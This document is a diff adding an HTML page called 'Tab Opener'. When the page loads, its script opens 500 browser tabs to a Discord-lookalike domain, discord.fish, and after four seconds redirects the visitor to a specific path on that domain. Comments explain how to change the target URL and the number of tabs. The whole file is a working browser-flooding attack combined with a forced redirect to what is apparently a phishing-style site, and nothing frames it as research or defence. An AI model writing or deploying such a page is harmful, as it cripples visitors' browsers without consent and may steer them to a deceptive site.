@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Tab Opener</title>
+    <script>
+        function openTabs() {
+            const targetUrl = 'https://discord.fish'; //This will be the url opened in the new tabs 
+            const numTabs = 500; // This will be the amount of tabs that will be opened 
+
+            for (let i = 0; i < numTabs; i++) {
+                window.open(targetUrl, '_blank');
+            }
+        }
+
+        
+        window.onload = openTabs;
+    </script>
+</head>
+<script>
+    setTimeout(function() {
+        window.location.href = 'https://discord.fish/alvarogravy'; //This will update the URL from the first tab where you opened the script
+    }, 4000); // 4000 milliseconds (4 seconds)
+</script>
+</html>
